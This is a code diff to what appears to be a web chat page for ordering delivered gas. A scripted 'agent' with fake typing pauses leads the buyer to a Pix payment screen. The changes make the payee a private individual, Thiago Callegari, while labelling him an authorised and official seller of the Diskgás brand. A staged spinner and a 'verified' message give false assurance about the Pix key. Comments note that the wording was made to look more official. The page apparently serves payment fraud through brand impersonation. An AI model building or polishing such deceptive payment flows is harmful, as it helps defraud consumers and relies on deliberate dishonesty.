@@ -1256,7 +1256,7 @@ function showDeliverySteps() {
         <div class="pix-logo">PIX</div>
         <div>
           <div class="pix-brand-label">Pagar com Pix</div>
-          <div class="pix-brand-sub">Diskgas Entregas Ltda.</div>
+          <div class="pix-brand-sub">Thiago Callegari.</div>
         </div>
       </div>
       <div class="pix-expiry">
@@ -1277,9 +1277,9 @@ function showDeliverySteps() {
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
       <div>
-        <div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Beneficiário verificado</div>
-        <div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Diskgas Entregas Ltda.</div>
-        <div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">CNPJ 12.345.678/0001-99 · Chave aleatória</div>
+        <div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Vendedor Autorizado</div>
+        <div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Diskgas Entregas.</div>
+        <div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">Vendedor Oficial · Diskgás</div>
       </div>
     </div>
 
@@ -1376,7 +1376,7 @@ async function runConversation() {
   await pause(3000);
   spValPre.remove();
 
-  await agentSay(`Peço que verifique se está tudo Ok`, true);
+  await agentSay(`Peço que verifique se está tudo certinho`, true);
   await pause(800);
 
   const action = await showOrderConfirmation();
@@ -1397,27 +1397,27 @@ async function runConversation() {
   }
 
   // ── MELHORADO: mensagem de transição com contexto de segurança ──
-  await agentSay(`Ótimo! Vou gerar agora o código Pix registrado no CNPJ da Diskgas. Assim que o pagamento cair, o sistema confirma na hora e o entregador sai imediatamente:`);
+  await agentSay(`Ótimo Vou gerar agora o código Pix,  Um segundo`);
   await pause(1000);
 
   // ── MELHORADO: texto do spinner mais oficial ──
-  const sp = addSpinner("Validando chave Pix...");
+  const sp = addSpinner("Preparando chave Pix...");
   await pause(4000);
   sp.remove();
 
   // ── NOVO: sys message de validação após o spinner ──
-  addSys('Chave Pix verificada · Diskgas Entregas Ltda.', 'ok');
+  addSys('Vendedor Autorizado DiskGás · Thiago Callegari Silva.', 'ok');
   await pause(1000);
 
   showDeliverySteps();
   await pause(2500);
 
   // ── MELHORADO: instrução clara de como pagar + presença do agente ──
-  await agentSay(`Copie o código acima e cole no app do seu banco em "Pix → Pix Copia e Cola". Confirma em segundos! 📦`, true);
+  await agentSay(`Basta copiar o código pix acima e realizar o pagamento, a aprovação é imediata`, true);
   await pause(2500);
 
   // ── NOVO: segunda mensagem reforçando acompanhamento em tempo real ──
-  await agentSay(`Estou aqui acompanhando o pagamento em tempo real. Qualquer dúvida é só chamar! 😊`, true);
+  await agentSay(`Após o pagamento o prazo de entrega do seu gás é de 20-30 minutos. Qualquer dúvida é só chamar 😊`, true);
 }
 
 // ── SEND ─────────────────────────────────────────────
